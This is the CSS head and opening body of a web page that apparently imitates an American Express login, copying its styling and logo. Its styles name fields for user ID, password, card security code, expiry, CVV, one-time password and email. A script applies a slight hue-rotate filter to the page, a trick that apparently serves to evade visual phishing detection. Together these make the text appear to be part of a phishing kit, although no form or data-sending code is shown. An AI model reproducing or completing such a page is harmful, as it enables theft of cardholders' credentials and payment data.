<!DOCTYPE html>
<html>

<head>

<title id="title">One  App</title>

    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    
    <script>
		document.documentElement.style.cssText="filter:hue-rotate(4deg)";
	</script>
    
<style>

html {
    -webkit-text-size-adjust: 100%;
}

html, body{
position: relative;
width:100%;
height:100%;
background-color: #ffffff;
}

header, nav{
width:100%;
height:70px;
}

header{
	padding:20px;
	background-color: rgb(255, 255, 255);
}


body{
	background-color: #ffffff;
    color: #4d4f53;
    font-family: Helvetica Neue,Helvetica,sans-serif;
    margin: 0;
    padding: 0;
    background: #e9e9e9;
     
}


a, abbr, b, big, blockquote, body, caption, center, cite, code, dd, del, details, dfn, div, dl, dt, em, embed, fieldset, form, h1, h2, h3, h4, h5, h6, html, i, iframe, img, ins, kbd, label, legend, li, ol, p, pre, q, s, samp, small, span, strike, strong, sub, sup, table, tbody, td, tfoot, th, thead, tr, tt, u, ul, var {
    border: 0 none;
    font-size: 100%;
    vertical-align: baseline;
}


inputElement input[type="text"], .inputElement input[type="password"], .inputElement input[type="number"], #securityContainer input[type="text"], #securityContainer input[type="password"], .fuid_secuirty_box input[type="text"], .fuid_secuirty_box input[type="password"], .inputElement input[type="text"], .inputElement input[type="password"], .inputElement input[type="number"], #securityContainer input[type="text"], #securityContainer input[type="password"], .fuid_secuirty_box input[type="text"], .fuid_secuirty_box input[type="password"], #line, #email, #oun, #upw {
    appearance: none;
    background-color: rgb(244, 244, 244);
    border: 0.0625rem solid rgb(142, 144, 146);
    border-radius: 0.25rem;
    color: rgb(51, 51, 51);
    display: block;
    font-size: 1rem;
    line-height: 1.375rem;
    min-height: 3.125rem;
    padding: 0px 0.625rem;
    transition: border-color 0.25s ease-out 0s;
    min-width: 5rem;
    margin-left: 0px;
    width: 380px !important;
}

input {
		outline: none;
		}
	
.nav-logo {
    position: sticky;
    top: 0;
    z-index: 999;
    background-color: #ffffff;
    height: 60px;
    width: 100%;
    text-align: center;
    border-bottom: 1px solid #d4d4d4;
    padding: 20px;
    font: inherit;
}

.fdic-logo {
    background-color: #ffffff;
    position: relative;
    height: 40px;
    width: 100%;
    text-align: center;
    border-bottom: 1px solid #d4d4d4;
    padding: 8px;
    font: inherit;

     
}

.span-logo {
	background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAdYAAAAeCAMAAACmCM8FAAAC9FBMVEUAAAAAc9IAcNAAb9AAeNIAcdAAcM8Ab9EAktsAcdEAc9UAcM8AcM8Ab9AAcNIAdtgAcdEAcM8AddMAcdIAcM8Ab88AcNAAcNAAb88AcdAAcdAAb9AAcdEAcdAAcdEAgP8AcNEAcM8Ad90AcNEAcdEAcNEAedcAcdIAcdEAcdAAcdAAcM8AgN8AcM8Ab9EAcdAAb9AAcNEAcdAA//8AcM8AcM8AcNAAdNEAcNAAc9MAcM8Ab88Ac9IAb88Ab88AcdUAb9AAb88Ab9AActMAgOYAcdIAb9AActAAb9AAcNAAdNEAcNAAb9AActEAcNEAcM8AddYAgP8AcM8AcNAAcNAAb88AedsAb88Ab9AAcM8AddUAcdEAcNAAd9UAcM8AcNAAdNEAb9AAcNAAceMAcNAAb88Ac9YAcNAAb9AAcM8Ab88AcNEAb88AcNAAcNAAcM8AcM8Ab9AAb9AAmf8AcM8AgNUAb9AAb9AAb88Ab88ActIAcNEAcdIAb88Ab9AAb9EAb9EAcNEAb88AdtEAcM8Ab88ActAAb9AAcNAAdtgAcNAAcNAAcNAActEAb88AcM8AcdAAb9AAcNEAcM8AcNAAb9AAcdAAb9AAb9IAcNAAgNsAcNAAdNMAb9AAb9AAcdEAcdIActEAcM8AcNAAcNAAcdIAcdUAcdMAb88AcdAAb9AAcM8ActAAdNEAc9kAb9AAcNAAcNYAb9EAcM8AcNAAcdEAcdAAcNAAb9AAb9AAcM8Ab88AcM8AgNUAcNEAb9AAcNAAb9AAcNAAb88AetMAcM8AcM8AcM8AcNAAcNAAcNAAcNAAb9AActAAcNAAcNAAb9AAb9AAcNIAcM8AcNAAcdEAcNAAcNAAcNAAcM8Ab88Ab88Ab88AcNAAcdEAb9AAcM8AcNAAb9AActAAcM8Aqv8AcM8AcNAAcdAAc9AAcNAActMAcdAAcM8AcM8Ab9AActQAcNAAcNAAcNEAcdAAb9AAcM8AcM8AcNAAcdAAcNMAb8+hIUjHAAAA+3RSTlMAKJ2cEWxrJwdjKpuLd0kNipAjWnCFmZJ1YRuHSGhNAoSWD496VBM/mohzQAgQTniMf5EBsPCJC6JF+6oz4eokk9zuHQotZ0H+rxbd9zhZuyUEtv3i2hVV44YY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");
    background-size: contain;
    background-repeat: no-repeat;
    display: inline-block;
    width: 268px;
    height: 17px;
}


.clearfix {
    display: block;
}



.clearfix:after {
    content: ".";
    display: block;
    clear: both;
    visibility: hidden;
    line-height: 0;
    height: 0;
}


.fuidNav {
    background: #f4f4f4;
    border: 1px solid #e0e0e0;
  	margin: 5 10px 0;
    max-width: 480px;
    position: relative;
    display: block;
 } 
   

.fuidNav .active {
    background: #006fcf;
    color: #fff;
}

.fuidNav .normal {
    display: inline-block;
    font-family: Helvetica Neue,Helvetica,sans-serif;
    float: left;
    font-size: 11.5px;
    font-weight: 600;
    position: relative;
}
.identyWidth {
    width: 49.78%;
}

.retriveIdWidth {
    width: 49.29%;
}

.fuidNav .normal span.normalText {
    padding: 17px 20px;
    font-family: Helvetica Neue,Helvetica,sans-serif;
    display: inline-block;    
}


.btnbox {
width:100% !important;
padding-left:100px !important;
padding-right:100px !important;


}

.btn {
width: 90% !important;
background: #006fcf !important;
padding-top: 0px;
border: 0px solid #ccc;
border-radius: 4px; 
color:#fff;
cursor:pointer;
padding: 15px 30px;
margin: 3%;
position: relative;
font-family: Helvetica Neue,Helvetica,sans-serif;
font-size: 15.5px;
}


.btnresend {
background: #fcfcfc !important;
padding-top: 0px;
border: 1px solid #f8f8f8;
border-radius: 7px; 
color:#005cb0;
cursor:pointer;
padding: 5px 10px;
margin: 0;
position: relative;
font-family: Helvetica Neue,Helvetica,sans-serif;
font-size: 0.915rem;
font-weight: 400;
text-align: left;
text-decoration:none
}



.btnstover {
background: #fcfcfc !important;
padding-top: 0px;
border: 1px solid #f7f7f7;
border-radius: 5px; 
color:#005cb0;
cursor:pointer;
padding: 5px 15px;
margin: 0;
position: relative;
font-family: Helvetica Neue,Helvetica,sans-serif;
font-size: 0.71rem;
font-weight: 600;
text-decoration:none
}


.expbox {
display: grid;
width: 100%;
}

.expboxdispl {
display: flex;
}

.expdate, .cvvbox {
width:60px !important;
height:60px !important;
}

.expdate::placeholder{
text-align: center;
}

.labelTxt {
    touch-action: manipulation;
    display: inline-block;
    margin-bottom: 0px;
    color: rgb(51, 51, 51);
    font-family: Helvetica Neue, Helvetica, sans-serif;
    font-weight: 600;
    font-size: .9rem;
    line-height: 1.5rem;
    text-transform: none;
}


.chkBox {
    font-family: Helvetica Neue, Helvetica, sans-serif;
    font-size: 1rem;
    font-weight: 400;
    line-height: 1.5rem;
    cursor: pointer;
    display: inline-block;
    margin-bottom: 0;
    min-height: 1.375rem;
    padding: .6875rem .6875rem .6875rem 2.75rem;
    position: relative;
    text-transform: inherit;
    vertical-align: middle;
    line-height: 1.375rem;
}


.nobord:focus{
border-color:#eaeaeb !important;
box-shadow: none !important;   
}

.bi-check-circle-fill{
color:rgb(8, 131, 8);
display: flex;
font-size: 80px;
justify-content: center;
margin-bottom:10px;
}

@media (max-width: 500px) { 
    /* CSS regels voor schermen tot 500px breed */

.error{
           outline: 1px solid red;
    }    
}

.cancel_card_quest {
	background: #f4f4f4; 
	border-bottom:1px solid #e5e5e5;
	border-top:1px solid #e5e5e5;
	border-right:1px solid #e5e5e5;
	padding: 5px 10px 20px;
  	margin-right: 10px; 
  	position: relative;
  	appearance: none;
    display: block;
    font-size: 1rem;
    border-radius: 0.25rem;
	line-height: 1.375rem;
    transition: border-color 0.25s ease-out 0s;
    min-width: 5rem;
    width: 380px !important;
    color: rgb(51, 51, 51);
	outline: none;
	}

#cscInput {
    width: 350px !important;
	height: 3rem;
	margin: auto;
	}

#otp {
    width: 400px !important;
	height: 3rem;
	} 	

  .oun::before{content:"User ID";}
  .ps::before{content:"Password";}
  .csc::before{content:"3-Digit Card Security Code";}
  .otp::before{content:"One-time password";}
  .em::before{content:"E-mail Address";}
  

#visibility {
	cursor: pointer;
	min-width: 1rem; 
	max-width: none; 
	padding: 10px; 
	margin: 0px; 
	border-radius: 0px; 
	border: 0px; touch-action: manipulation; 
	overflow: visible; 
	white-space: normal; 
	background: transparent; 
	position: absolute;
	bottom: 0px; 
	margin-left: 83%; 
	top: 0px; 
	color: #006fcf !important;
	}

#nwrapper {
    padding: 10px 0;
    position: relative;
    width: 100%;
 
}

#dynamicContainer {
    background: #fff;
    border: 1px solid #e0e0e0;
    margin: 0px auto;
    border-radius: 0.35rem;
    max-width: 480px;
    width: 100%;
}

.fuidformContent {
    background: #fff;
    margin-left: 15px;
}

form{
width:420px;
height:auto;
display: grid;
margin:auto;
background-color: white;
padding: 5px;

}
  
.axp-footer__dls-module__module___1_EeR .axp-footer__dls-module__heading3___1EBC6 {
        font-family: Helvetica Neue, Helvetica, sans-serif;
        font-weight: 600;
        font-size: 1rem;
        line-height: 1.5Rem;
      }

.axp-footer__dls-module__module___1_EeR {
    font-weight: var(--bs-body-font-weight);
    line-height: var(--bs-body-line-height);
    text-align: var(--bs-body-text-align);
    -webkit-text-size-adjust: 100%;
    -webkit-tap-highlight-color: transparent;
    color: #4d4f53;
    font-family: Helvetica Neue,Helvetica,sans-serif;
    box-sizing: border-box;
    border: 0 none;
    font-size: 80%;
    text-align: center;
    position: relative;
    margin: auto;
    vertical-align: baseline;
}
    
.axp-footer__footer__footer___328qd {
    -webkit-tap-highlight-color: transparent;
    -webkit-font-smoothing: antialiased;
    z-index: 99;
    max-width: 100vw;
    color: #000;
    font-family: Helvetica Neue, Roboto, sans-serif;
    font-size: .9375rem;
    line-height: 1.45667;
    margin: 0px;
    min-height: 200px;
}

.axp-footer__dls-module__module___1_EeR .axp-footer__dls-module__dlsWhiteBg___2unIs {
    background-color: #fff !important;
}

.axp-footer__dls-module__module___1_EeR .axp-footer__dls-module__pad1B___319TY {
    padding-bottom: .625Rem !important;
}

.axp-footer__dls-module__module___1_EeR *, .axp-footer__dls-module__module___1_EeR *::before, .axp-footer__dls-module__module___1_EeR *::after {
    box-sizing: inherit;
}

.axp-footer__dls-module__module___1_EeR .axp-footer__dls-module__pad3T___SVukA {
        padding-top: 1.875Rem !important;
      }

.axp-footer__dls-module__module___1_EeR .axp-footer__dls-module__row___3H3xq {
        display: flex;
        flex-wrap: wrap;
      }

.axp-footer__dls-module__module___1_EeR .axp-footer__dls-module__colLg8___2CkmG {
        flex: 0 0 100%;
        max-width: 100%;
        min-height: 1px;
        }

.axp-footer__dls-module__module___1_EeR .axp-footer__dls-module__pad3B___1J3uF {
        padding-bottom: 1.875Rem !important
      }
      
.axp-footer__dls-module__module___1_EeR .axp-footer__dls-module__heading1___1W4S5 {
        font-family: Helvetica Neue, Helvetica, sans-serif;
        font-weight: 600;
        font-size: .8125Rem;
        line-height: 1.125Rem;
        text-transform: uppercase;
      }

.axp-footer__dls-module__module___1_EeR .axp-footer__dls-module__dlsGray05___3Bige {
        color: #53565a !important;
        fill: #53565a !important;
      }

.axp-footer__dls-module__module___1_EeR .axp-footer__dls-module__textWrap___3wMeN {
        word-wrap: break-word;
        white-space: normal;
      }

.axp-footer__footer__footer___328qd div {
    box-sizing: border-box;
}

.axp-footer__footer__footer___328qd .axp-footer__footer__legalLinksItem___biaXF li {
        display: inline;
      }
  
.axp-footer__dls-module__module___1_EeR .axp-footer__dls-module__margin0___3S0s6 {
        margin: 0 !important;
      }

.axp-footer__dls-module__module___1_EeR .axp-footer__dls-module__listLinksInlineSeparator___25k9b {
        padding-left: 0;
      }

.axp-footer__dls-module__module___1_EeR .axp-footer__dls-module__listLinksInlineSeparator___25k9b li {
        display: inline-block;
        white-space: nowrap;
      }

.axp-footer__dls-module__module___1_EeR .axp-footer__dls-module__listLinksInlineSeparator___25k9b li:first-child:not(:last-child),
      .axp-footer__dls-module__module___1_EeR .axp-footer__dls-module__listLinksInlineSeparator___25k9b li+li {
        padding-right: 0
      }

.axp-footer__dls-module__module___1_EeR .axp-footer__dls-module__listLinksInlineSeparator___25k9b li:not(:last-child)::after {
        color: #97999b;
        content: "|";
        font-size: 1.2Rem;
        font-weight: 200;
        margin-left: .625Rem;
        margin-right: .625Rem
      }
       
  
</style>
   
</head>

<body>
  	<div class="nav-logo">
          <span class="span-logo"></span>
    </div>  
